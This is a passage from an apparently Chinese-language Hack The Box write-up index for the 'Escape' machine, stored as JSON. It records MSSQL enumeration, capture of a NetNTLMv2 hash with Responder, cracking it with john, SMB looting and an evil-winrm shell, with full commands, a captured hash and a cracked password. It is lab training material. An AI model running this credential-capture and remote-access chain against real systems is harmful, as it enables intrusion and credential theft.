10.10.11.202:1433 -  - ##MS_SmoExtendedSigningCertificate##\n[*] 10.10.11.202:1433 -  - BUILTIN\\Users\n[*] 10.10.11.202:1433 -  - NT AUTHORITY\\SYSTEM\n[*] 10.10.11.202:1433 -  - NT SERVICE\\SQLTELEMETRY$SQLMOCK\n[*] 10.10.11.202:1433 -  - NT SERVICE\\SQLWriter\n[*] 10.10.11.202:1433 -  - NT SERVICE\\Winmgmt\n[*] 10.10.11.202:1433 -  - NT Service\\MSSQL$SQLMOCK\n[*] 10.10.11.202:1433 -  - PublicUser\n[*] 10.10.11.202:1433 -  - sa\n[*] 10.10.11.202:1433 -  - sequel\\Administrator\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-auxiliaryadminmssqlmssql_findandsampledata","title":"msf&gt; use auxiliary/admin/mssql/mssql_findandsampledata","text":"<p>\u65e0\u6709\u7528\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-auxiliaryscannermssqlmssql_hashdump","title":"msf&gt; use auxiliary/scanner/mssql/mssql_hashdump","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_9","title":"\u4fe1\u606f\u6574\u7406","text":"<ul> <li>Instance Name: \"SQLMOCK\"</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_10","title":"\u626b\u63cf\u7ed3\u679c","text":"<pre><code>[*] 10.10.11.202:1433     - Instance Name: \"SQLMOCK\"\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-auxiliaryscannermssqlmssql_schemadump","title":"msf&gt; use auxiliary/scanner/mssql/mssql_schemadump","text":"<p>\u65e0\u6709\u7528\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf-use-auxiliaryadminmssqlmssql_ntlm_stealer","title":"msf&gt; use auxiliary/admin/mssql/mssql_ntlm_stealer","text":"<p>\u5e94\u8be5\u662f\u53ea\u6709NTLMv1\u6211\u4eec\u624d\u80fd\u7834\u89e3\u3002\u4e0d\u8fc7\u59d1\u4e14\u5148\u62ff\u4e86\u3002</p> <p>\u6839\u636ehacktricks\u7684steal-netntlm-hash-relay-attack\uff0c\u8981\u5f00\u542fResponder\uff0c\u4e0d\u8fc7\u5728\u8fd9\u4e4b\u524d\u914d\u7f6e\u4e00\u4e0bconf\uff0c\u5c06\u6311\u6218\u503c\u6539\u4e3a\u56fa\u5b9a\u7684 <code>Challenge = 1122334455667788</code>\uff08NTLMv1\u7684\u8bdd\u5f04\u8fd9\u6b65\u4f1a\u6613\u7834\u89e3\u4e9b\uff0c\u4e0d\u77e5\u9053NTLMv2\u4f1a\u4e0d\u4f1a\u4e5f\u662f\uff09 <pre><code>\u2514\u2500$ sudo vim /etc/responder/Responder.conf\n</code></pre></p> <p>\u5c1d\u8bd5\u964d\u7ea7NTLM\u8ba4\u8bc1\uff0c\u4e0d\u8fc7\u6ca1\u6536\u5230\u54cd\u5e94 </p> <p>If you are using responder you could try to **use the flag --lm ** to try to downgrade the authentication.</p> <p>\u6b63\u5e38\u5f00\u542fResponder\u76d1\u542c\uff1a <pre><code>\u2514\u2500$ sudo responder -I tun0 -v\n</code></pre></p> <p>\u5982\u679c\u4e4b\u524d\u6355\u83b7\u8fc7NTLM\u54cd\u5e94\u7684\u8bdd\u4e0d\u52a0 <code>-v</code> \u9009\u9879\u5219\u4f1a\u8df3\u8fc7\uff1a</p> <p>[*] Skipping previously captured hash If you wish to keep seeing the hashes for same user add the v option.</p> <p>msf\u6a21\u5757\u8fd8\u6709\u4e2a\u989d\u5916\u7684\u53c2\u6570 <code>SMBPROXY</code>\uff0c\u914d\u7f6e\u4e3atun0\u7684IP\u540e\u8fd0\u884c\u6a21\u5757\u3002 Responder\u6536\u5230\u54cd\u5e94\uff08log\u4fdd\u5b58\u5728 <code>/usr/share/responder/logs/</code>\uff09\uff1a <pre><code>[SMB] NTLMv2-SSP Client   : 10.10.11.202\n[SMB] NTLMv2-SSP Username : sequel\\sql_svc\n[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1122334455667788:1DB61AB04018DE6DB8FEEF810636E9CD:010100000000000080D9D4393B95D901746A11FB7DBD1278000000000200080046004B004900510001001E00570049004E002D003500330033004100440050003400310042003800490004003400570049004E002D00350033003300410044005000340031004200380049002E0046004B00490051002E004C004F00430041004C000300140046004B00490051002E004C004F00430041004C000500140046004B00490051002E004C004F00430041004C000700080080D9D4393B95D901060004000200000008003000300000000000000000000000003000003C07B4878B999156F7276A845E9C66C484700A331A7AAC98EBB52896F0F737080A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310030000000000000000000\n</code></pre></p> <p>\u59d1\u4e14\u5c06\u5176\u6254\u7ed9john\uff0c\u7ee7\u7eed\u8003\u8651\u5176\u4ed6\u653b\u51fb\u8def\u5f84\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_11","title":"\u4e2d\u573a\u4f11\u606f\uff0c\u6574\u7406\u601d\u8def","text":"<p>\u5176\u5b9e\u4e00\u5f00\u59cb\u6ce8\u610f\u5230PDF\u91cc\u9762\u63d0\u5230\u975e\u57df\u673a\u5668\u8bbf\u95eeMSSQL\u4e5f\u9700\u8981\u4e0b\u8f7dSSMS\uff0c\u70b9\u4e86\u4e00\u4e0b\u662f\u4e2aexe\u6587\u4ef6\u3002\u7531\u4e8e\u6ca1\u51c6\u5907Windows\u673a\u5668\u6240\u4ee5\u5c31\u6682\u65f6\u653e\u7f6e\u4e86\u3002</p> <p>\u6253\u5230\u73b0\u5728\uff0c\u611f\u89c9\u8fd9\u4e2aNTLMv2 Hash\u5e94\u8be5\u7834\u89e3\u4e0d\u4e86\uff0c\u800c\u4e14\u8fd9\u4e2a\u4f3c\u4e4e\u5e76\u4e0d\u9700\u8981\u7834\u89e3\uff0c\u5e94\u8be5\u662f\u53ef\u4ee5\u76f4\u63a5relay\u5229\u7528\u7684\u3002</p> <ul> <li>\u4ee5\u53ca\u5728hacktricks\u91cc\u7ffb\u770b1433\u7aef\u53e3\u7684NTLM relay\u65f6\uff0c\u4eceNTLM\u7684\u5f3a\u5236\u8ba4\u8bc1\u91cc\u6ce8\u610f\u5230Inside Windows - MSSQL\uff0c\u63d0\u5230\u5982\u679c\u5728Windows\u673a\u5668\u91cc\u7684\u8bdd\uff0c\u53ef\u4ee5\u5f3a\u5236Windows\u4f7f\u7528\u7279\u6743\u8d26\u6237\u8fde\u63a5\u5230\u670d\u52a1\u5668\u3002\u90a3\u4e48\u53ef\u80fd\u7684\u653b\u51fb\u8def\u5f84\u5c31\u662f\u5148\u8fdbMSSQL\u91cc\uff0c\u7136\u540e\u5f3a\u5236\u8ba4\u8bc1\u83b7\u53d6\u7279\u6743\u8d26\u6237\u7684NTLMv2 Hash\uff0c\u7136\u540e\u4e0d\u7528\u66b4\u7834\u76f4\u63a5relay\u4ee5\u83b7\u53d6\u7279\u6743\u8d26\u6237\uff1f</li> <li>\u4e0d\u8fc7\u53c8\u770b\u5230\u8fd9\u4e2aMultiRelay\u5199\u5230\u201c\u9ed8\u8ba4\u8fd4\u56de\u4e00\u4e2ashell\u201d\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4e0d\u8fde\u63a5MSSQL\uff0c\u7528NTLM relay\u83b7\u5f97shell\uff1f</li> </ul> <p>\u4f46\u662f\u6211\u7a81\u7136\u610f\u8bc6\u5230\uff0c\u597d\u50cf\u6ca1\u6709\u53ef\u4ee5relay\u7684\u76ee\u6807\u2026\u2026\uff1f\u4ee5\u53ca\u6ca1\u6709\u672c\u5730\u7ba1\u7406\u5458\u8d26\u53f7 </p> <p>Please, note that the relayed authentication must be from a user which has Local Admin access to the relayed host</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#john1","title":"john\u610f\u5916\u66b4\u7834\u6210\u529f\uff0c\u83b7\u5f971\u4e2a\u57df\u7528\u6237\u51ed\u636e","text":"<p>\u4e4b\u524d\u7528\u7684\u662f\u9ed8\u8ba4\u5b57\u5178\uff0c\u867d\u7136\u6570\u91cf\u5c11\u4f46\u662f\u4e5f\u975e\u5e38\u8017\u65f6\u7684\u6837\u5b50\uff0c\u4e0d\u62b1\u4ec0\u4e48\u5e0c\u671b\u5730\u59d1\u4e14\u653e\u5728\u540e\u53f0\u8dd1\u7740\u4e86\u3002 \u7136\u800c\u5728hacktricks\u7ffb\u770bNTLM\u76f8\u5173\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u770b\u5230\u8bf4NTLMv2\u53ef\u4ee5\u6307\u5b9a <code>--format=netntlmv2</code>\u3002\u4e00\u8fb9\u60f3\u7740\u4f3c\u4e4e\u672c\u8eabjohn\u4e5f\u8bc6\u522b\u51fa\u662f\u201cnetntlmv2\u201d\u4e86\u554a\uff0c\u5e94\u8be5\u4e0d\u7528\u6307\u5b9a\u4e5f\u6ca1\u4e8b\u5427\uff0c\u4e00\u8fb9\u53c8\u91cd\u65b0\u8bd5\u4e86\u4e0b\uff0c\u7adf\u7136\u79d2\u7834\uff01\uff1f</p> <pre><code>\u2514\u2500$ john --format=netntlmv2 --wordlist=/usr/share/wordlists/rockyou.txt SMB-NTLMv2-SSP-10.10.11.202.txt \nUsing default input encoding: UTF-8\nLoaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nREGGIE1234ronnie (sql_svc)     \n1g 0:00:00:02 DONE (2023-06-02 10:20) 0.3546g/s 3795Kp/s 3795Kc/s 3795KC/s RENZOJAVIER..RBDesloMEJOR\nUse the \"--show --format=netntlmv2\" options to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>\u77ac\u95f4\u51fa\u7ed3\u679c\uff0c\u8fd8\u4ee5\u4e3a\u662f\u56e0\u4e3a\u8fd9\u4e2a\u5bc6\u7801\u5728\u5b57\u5178\u91cc\u975e\u5e38\u9760\u524d\uff0c\u786e\u8ba4\u4e86\u4e00\u4e0b\u4e5f\u4e0d\u662f\u554a\u3002 \u539f\u6765\u6211\u8fd8\u662f\u4f4e\u4f30\u4e86john\u7684\u901f\u5ea6\uff0c\u770b\u6765\u53ea\u8981\u6307\u5b9a\u597dformat\u8fd8\u662f\u975e\u5e38\u8fc5\u901f\u7684\u2026\u2026 <pre><code>\u2514\u2500$ grep -n \"REGGIE1234ronnie\" /usr/share/wordlists/rockyou.txt\n10700144:REGGIE1234ronnie\n\n\u2514\u2500$ wc -l /usr/share/wordlists/rockyou.txt\n14344392 /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>\u6240\u4ee5\u6211\u4eec\u83b7\u5f97\u65b0\u51ed\u636e\uff0csequel/sql_svc:REGGIE1234ronnie\u3002</p> <ul> <li>\u4f46\u662f\u8981\u5982\u4f55\u4f7f\u7528\u5462\uff1f  </li> <li>\u8fd9\u662f\u4e2a\u4ec0\u4e48\u6743\u9650\u5462\uff1f  </li> <li>\u8981\u662f\u8bf4\u767b\u5f55MSSQL\u7684\u8bdd\uff0c\u53c8\u56de\u5230\u8981\u4e0b\u8f7dSSMS\u7684\u95ee\u9898\u4e0a\u4e86\u3002</li> <li>\u5e94\u8be5\u53ef\u4ee5\u7528\u8fd9\u4e2a\u8d26\u6237\u770b\u770bSMB\uff1f  </li> <li>\u9014\u4e2d\u4e5f\u5c1d\u8bd5\u4e86\u4e0b\u7528\u8fd9\u4e2a\u51ed\u636e\u8dd1\u4e0a\u9762\u7684msf\u6a21\u5757\uff0c\u4f46\u662f\u90fd\u8bf4\u767b\u5f55\u5931\u8d25\u2026\u2026\uff08\u540e\u6765\u53d1\u73b0\u662f\u914d\u7f6e\u9519\u8bef\uff0c\u53c2\u7167\u540e\u6587\uff09</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_12","title":"\u5229\u7528\u65b0\u51ed\u636e\u7684\u63a2\u7d22\u4e4b\u8def","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#smb","title":"SMB","text":"<p>\u5148smbmap\u770b\u4e00\u773c\uff1a <pre><code>\u2514\u2500$ smbmap -u sql_svc -d sequel -p 'REGGIE1234ronnie' -H ${HTB_IP}\n[+] IP: 10.10.11.202:445        Name: 10.10.11.202                                      \n        Disk                                                    Permissions     Comment\n        ----                                                    -----------     -------\n        ADMIN$                                                  NO ACCESS       Remote Admin\n        C$                                                      NO ACCESS       Default share\n        IPC$                                                    READ ONLY       Remote IPC\n        NETLOGON                                                READ ONLY       Logon server share \n        Public                                                  READ ONLY\n        SYSVOL                                                  READ ONLY       Logon server share\n</code></pre></p> <p>\u770b\u4e86\u4e0b\u53ea\u6709 <code>/SYSVOL</code> \u91cc\u6709\u4e1c\u897f\uff1a <pre><code>\u2514\u2500$ smbclient //${HTB_IP}/SYSVOL -U sequel/sql_svc --password=REGGIE1234ronnie\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; ls\n  .                                   D        0  Fri Nov 18 12:11:44 2022\n  ..                                  D        0  Fri Nov 18 12:11:44 2022\n  sequel.htb                         Dr        0  Fri Nov 18 12:11:44 2022\n</code></pre></p> <p>\u6587\u4ef6\u5939\u6709\u70b9\u591a\u7684\u6837\u5b50\uff0c\u4e8e\u662f\u53c2\u8003\u8fd9\u91cc\u7684\u547d\u4ee4\uff0c\u9012\u5f52\u4e0b\u8f7d\u6240\u6709\u6587\u4ef6\uff1a <pre><code>\u2514\u2500$ mkdir sequel.htb; cd $_\n\n\u2514\u2500$ smbclient \"//${HTB_IP}/SYSVOL\" -U sequel/sql_svc --password=REGGIE1234ronnie -c 'prompt OFF;recurse ON;cd \"sequel.htb\";mget *'\n</code></pre></p> <p>\u7136\u540e\u770b\u4e86\u4e0b\u53ea\u6709Policies\u6587\u4ef6\u5939\u91cc\u6709\u4e1c\u897f\uff0c\u4e0d\u4f1a\u662f\u8981\u5206\u6790\u8fd9\u4e2a\u5427\u2026\u2026 <pre><code>\u2514\u2500$ ls *                                                               \n{31B2F340-016D-11D2-945F-00C04FB984F9}:\nGPT.INI  MACHINE  USER\n\n{6AC1786C-016F-11D2-945F-00C04fB984F9}:\nGPT.INI  MACHINE  USER\n</code></pre></p> <p>\u770b\u4e86\u4e0b\u8f83\u53ef\u7591\u7684\u53ea\u662f <code>{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol</code> \u91cc\u51fa\u73b0\u201cAdministrator@sequel\u201d\u7684\u5b57\u6837\uff0c\u4f46\u662f <code>cat</code> \u7684\u8bdd\u662f\u4e71\u7801\uff0c<code>strings</code> \u4e5f\u6ca1\u53d1\u73b0\u7279\u522b\u7684\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#mssql","title":"\u767b\u9646MSSQL","text":"<p>\u4e07\u7b56\u5c3d\u2026\u2026\u60f3\u7740\u96be\u9053\u53ea\u80fd\u4e0b\u8f7dSSMS\u624d\u80fd\u767b\u9646MSSQL\u5417\uff1f\u4e8e\u662f\u641c\u7d22MSSQL\u7684\u767b\u9646\u65b9\u6cd5\uff0c\u7ffb\u7ffb\u627e\u627e\u53c8\u56de\u5230hacktricks\uff0c\u8fd9\u6b21\u624d\u6ce8\u610f\u5230\u539f\u6765\u91cc\u9762\u5199\u4e86\u53ef\u4ee5\u7528 <code>mssqlclient.py</code> \u767b\u9646\u3002</p> <p>\u7531\u4e8e\u7b2c\u4e00\u6b21\u7528\u8fd9\u4e2a\uff0c\u6709\u4e9b\u9009\u9879\u4e0d\u662f\u5f88\u61c2\u5c31\u8bd5\u4e86\u4e0b\uff1a<code>mssqlclient.py [-db volume] -windows-auth &lt;DOMAIN&gt;/&lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;</code> \u770bhelp\u91cc\u9762\u7684\u8fd9\u4e2a\u89e3\u91ca\u6709\u70b9\u8ba9\u4eba\u7591\u60d1\uff0c\u8fd8\u4ee5\u4e3a\u201cinstance\u201d\u662f\u6307\u4e4b\u524d\u679a\u4e3e\u51fa\u6765\u7684\u201cSQLMOCK\u201d\u5462\u3002\u7ed3\u679c\u8bd5\u4e86\u4e0b\u5c31\u662f\u6570\u636e\u5e93\u540d\uff08master\u3001tempdb\u3001model\u3001msdb\uff09  </p> <p>-db DB \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 MSSQL database instance</p> <p>\u800c <code>-windows-auth</code> \u867d\u7136\u4e0d\u592a\u786e\u5b9a\u5177\u4f53\u7684\u610f\u601d\uff0c\u4e0d\u8fc7\u6700\u521d\u4eceSMB\u5171\u4eab\u6536\u96c6\u5230\u7684PDF\u91cc\u4e5f\u63d0\u5230\uff0c\u90a3\u4e2a\u4e34\u65f6\u51ed\u636e\u5c31\u662f\u4e0d\u7528Windows\u8ba4\u8bc1\uff0c\u8981\u7528SQL\u670d\u52a1\u5668\u8ba4\u8bc1\u3002\u53ef\u80fd\u4e00\u4e2a\u662fSQL\u670d\u52a1\u5668\u5185\u90e8\u7684\u8ba4\u8bc1\uff0c\u4e00\u4e2a\u662fAD\u57df\u8ba4\u8bc1\uff1f \u540e\u6765\u641c\u4e86\u4e00\u4e0b\uff0c\u539f\u6765\u8fd9\u662fSQL Server\u63d0\u4f9b\u7684\u4e24\u79cd\u8ba4\u8bc1\u6a21\u5f0f\uff1aMS\u6587\u6863</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_13","title":"\u6d4b\u8bd5","text":"<pre><code>\u2514\u2500$ mssqlclient.py sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}              \nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[-] ERROR(DC\\SQLMOCK): Line 1: Login failed for user 'sql_svc'.\n\n\n\u2514\u2500$ mssqlclient.py -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL&gt; exit\n\n\n\u2514\u2500$ mssqlclient.py -db SQLMOCK -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[-] ERROR(DC\\SQLMOCK): Line 1: Cannot open database \"SQLMOCK\" requested by the login. The login failed.\n[-] ERROR(DC\\SQLMOCK): Line 1: Login failed for user 'sequel\\sql_svc'.\n\n\n\u2514\u2500$ mssqlclient.py PublicUser:GuestUserCantWrite1@${HTB_IP}\nImpacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english\n[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192\n[*] INFO(DC\\SQLMOCK): Line 1: Changed database context to 'master'.\n[*] INFO(DC\\SQLMOCK): Line 1: Changed language setting to us_english.\n[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) \n[!] Press help for extra shell commands\nSQL&gt; exit\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_14","title":"\u767b\u9646","text":"<p><code>mssqlclient.py -windows-auth sequel/sql_svc:REGGIE1234ronnie@${HTB_IP}</code></p> <pre><code>SQL&gt; ?\n\n     lcd {path}                 - changes the current local directory to {path}\n     exit                       - terminates the server process (and this session)\n     enable_xp_cmdshell         - you know what it means\n     disable_xp_cmdshell        - you know what it means\n     xp_cmdshell {cmd}          - executes cmd using xp_cmdshell\n     sp_start_job {cmd}         - executes cmd using the sql server agent (blind)\n     ! {cmd}                    - executes a local shell cmd\n\nSQL&gt; xp_cmdshell whoami\n[-] ERROR(DC\\SQLMOCK): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.\n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_15","title":"\u624b\u52a8\u679a\u4e3e","text":"<ul> <li>MSSQL\u8fd9\u4e2a\u8fd4\u56de\u683c\u5f0f\u662f\u771f\u7684\u4e11\u554a</li> <li>\u8fd9\u7528\u6237\u7adf\u7136\u53ea\u662f\u4e2aguest\u2026\u2026</li> <li>sa\u7528\u6237\u6ca1\u88ab\u7981\u7528\uff0c\u4e14\u5bc6\u7801\u4e3a\u7a7a\uff01\u4f46\u662f\u8bd5\u4e86\u4e0b <code>mssqlclient.py sa@${HTB_IP} -no-pass</code> \u53c8\u65e0\u6cd5\u767b\u9646\uff0c\u4e0d\u61c2\u4e3a\u4ec0\u4e48\u2026\u2026\u3010\u751a\u81f3\u6000\u7591\u8fd9\u4e2a\u6709\u6548\u662f\u4e4b\u524d\u7684\u73a9\u5bb6\u7559\u4e0b\u7684\uff0c\u4f46\u662f\u770b\u4fee\u6539\u65f6\u95f4\u53c8\u662f\u633a\u4e45\u4e4b\u524d\u7684\u2026\u2026\u540e\u6765\u91cd\u7f6e\u4e86\u4e00\u4e0b\u9776\u673a\u786e\u8ba4\uff0c\u7684\u786e\u5c31\u662f\u201cEnabled\u201d\u3011</li> </ul>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#log","title":"log","text":"<pre><code>SQL&gt; select user_name();\n\n\n--------------------------------------------------------------------------------------------------------------------------------   \n\nguest\n\nSQL&gt; select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;\nlogin                                                                                                                              login_type                                                                                                                                                                                                                                                                                                       password_hash   create_date   modify_date   status     \n\n--------------------------------------------------------------------------------------------------------------------------------   ------------------------------------------------------------   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   -----------   -----------   --------   \n\nsa                                                                                                                                 SQL_LOGIN                                                                                                                                                                                                                                                                                                                 NULL   2003-04-08 09:10:35   2022-11-18 13:43:07   b'Enabled' \n</code></pre>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#msf","title":"\u53d1\u73b0\u65b0\u51ed\u636e\u53ef\u4ee5\u7528msf\u626b\u63cf","text":"<p>\u4e4b\u524d\u8bf4\u626b\u63cf\u5931\u8d25\uff0c\u5176\u5b9e\u662f\u81ea\u5df1\u914d\u7f6e\u9519\u8bef\u3002 \u7ecf\u8fc7\u4e0a\u4e00\u8282\u7684\u6b65\u9aa4\u4e86\u89e3\u4e86MSSQL\u7684\u4e24\u79cd\u8ba4\u8bc1\u6a21\u5f0f\u4e4b\u540e\uff0c\u77e5\u9053\u81ea\u5df1\u7528\u65b0\u7684\u57df\u51ed\u636e\u5e94\u8be5\u4e00\u5b9a\u8981\u8bbe\u7f6e <code>USE_WINDOWS_AUTHENT  true</code>\u3002\u4f46\u662f\u4e4b\u524d\u53c8\u4e00\u76f4\u7591\u60d1\u8fd9\u4e2a\u9009\u9879\u5907\u6ce8\u7684\u201c(requires DOMAIN option set)\u201d\u7684domain\u53c2\u6570\u5728\u54ea\uff0c\u8c37\u6b4c\u4e86\u4e0b\u624d\u77e5\u9053msf\u6a21\u5757\u91cc\u8fd8\u6709\u4e2a <code>advance</code> \u547d\u4ee4\uff0cdomain\u53c2\u6570\u5728\u8fd9\u91cc\u9762\u3002 \u4e8e\u662f\u914d\u7f6e\uff1a <pre><code>msf6 &gt; set\n\nGlobal\n======\n\n  Name                 Value\n  ----                 -----\n  USE_WINDOWS_AUTHENT  true\n  domain               sequel\n  password             REGGIE1234ronnie\n  rhosts               10.10.11.202\n  username             sql_svc\n\nmsf6 auxiliary(admin/mssql/mssql_enum) &gt; advanced \n\nModule advanced options (auxiliary/admin/mssql/mssql_enum):\n\n   Name                     Current Setting                                          Required  Description\n   ----                     ---------------                                          --------  -----------\n\u2026\u2026\n   DOMAIN                   sequel                                                   yes       The domain to use for windows authentication\n\u2026\u2026\n</code></pre></p> <p>\u8bd5\u4e86\u4e0b\u53ef\u4ee5\u6210\u529f\u626b\u63cf\uff0c\u4e8e\u662f\u53c8\u5c06\u4e4b\u524d\u7528\u8fc7\u7684\u6a21\u5757\u8dd1\u4e86\u4e00\u904d\u770b\u770b\u6709\u65e0\u65b0\u4fe1\u606f\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_16","title":"\u679a\u4e3e\u7684\u65b0\u4fe1\u606f","text":"<ul> <li>xp_cmdshell is Not Enabled</li> <li>remote access is Enabled</li> </ul> <p>\u5176\u4ed6\u6a21\u5757\u5f97\u5230\u7684\u4fe1\u606f\u90fd\u5dee\u4e0d\u591a\u2026\u2026</p> <p>\u8fd9\u6761\u8def\u5927\u6982\u4e5f\u4e0d\u884c\u4e86\uff0c\u4e13\u6ce8\u5176\u4ed6\u8def\u7ebf\u3002</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#initial-access","title":"Initial Access","text":"","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#_17","title":"\u8bb0\u4f4f\uff1a\u83b7\u5f97\u6709\u6548\u51ed\u636e\u5c31\u5c1d\u8bd5\u6a2a\u5411\u79fb\u52a8","text":"<p>\u56de\u987e\u4e86\u4e00\u4e0bAPT\u9776\u673a\u7684\u8fc7\u7a0b\uff0c\u5230\u5e95\u662f\u600e\u4e48get shell\u7684\u2026\u2026</p>","tags":["HTB/Windows","HTB/Medium"]},{"location":"writeup/retired/HTB-Escape/#evil-winrmget-shell","title":"evil-winrm\u4f7f\u7528\u57df\u51ed\u636eget shell","text":"<p>\u771f\u662f\u5bf9 <code>evil-winrm</code> \u4e0d\u719f\u6089\uff0c\u5fd8\u4e86\u53ef\u4ee5\u8bd5\u8bd5\u8fd9\u4e2a\u554a\u2026\u2026 \u8bd5\u4e86\u4e00\u4e0b\uff0c\u987a\u5229get shell\uff1a <pre><code>\u2514\u2500$ evil-winrm -i ${HTB_IP} -u sql_svc -p REGGIE1234ronnie                \n\nEvil-WinRM shell v3.4\n\nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                 \n\nData: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   \n\nInfo: Establishing connection to remote endpoint\n\n*Evil-WinRM* PS C:\\Users\\sql_svc\\Documents&gt; whoami /all\n\nUSER INFORMATION\n----------------\n\nUser Name      SID\n============== ==============================================\nsequel\\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106\n\n\nGROUP INFORMATION\n-----------------\n\nGroup Name                                  Type             SID          Attributes\n=========================================== ================ ============ ==================================================\nEveryone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group\nBUILTIN\\Certificate Service DCOM Access     Alias            S-1-5-32-574 Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group\nNT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group\nMandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448\n\n\nPRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                    State\n============================= ============================== =======\nSeMachineAccountPrivilege     Add workstations to domain     Enabled\nSeChangeNotifyPrivilege       Bypass traverse checking       Enabled\nSeIncreaseWorkingSetPrivilege Increase a process working set Enabled\n\n\nUSER CLAIMS INFORMATION\n-----------------------\n\nUser claims unknown.\n\nKerberos support for Dynamic Access Control on this device has been disabled.\n</code></pre></p> <p>\u770b\u4e86\u773cflag\u5e94\u8be5\u4e0d\u5728\u8fd9\u4e2a\u7528\u6237\uff0c\u5927\u6982\u7387\u5728Ryan.Cooper\u91cc\u9762\u3002\u6240\u4ee5\u4e0b\u4e00\u6b65\u5c1d\u8bd5\u6a2a\u5411\u79fb\u52a8\u3002 <pre><code>*Evil-WinRM* PS C:\\Users&gt; ls\n\n\n    Directory: C:\\Users\n\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----         2/7/2023   8:58 AM                Administrator\nd-r---        7/20/2021  12:23 PM                